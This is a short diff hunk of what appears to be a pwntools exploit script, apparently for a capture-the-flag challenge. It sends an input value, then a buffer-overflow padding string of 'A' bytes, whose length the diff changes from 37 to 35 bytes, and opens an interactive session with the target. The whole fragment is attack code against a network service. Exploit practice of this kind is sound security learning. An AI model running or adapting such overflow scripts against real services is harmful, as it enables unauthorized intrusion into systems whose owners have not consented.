@@ -9,7 +9,7 @@ data = s.recvline()
 s.sendline(b"25")
 data = s.recvline()
 
-s.sendline(b'A' * 36 + b'A')
+s.sendline(b'A' * 34 + b'A')
 
 data = s.recv()
 s.interactive()
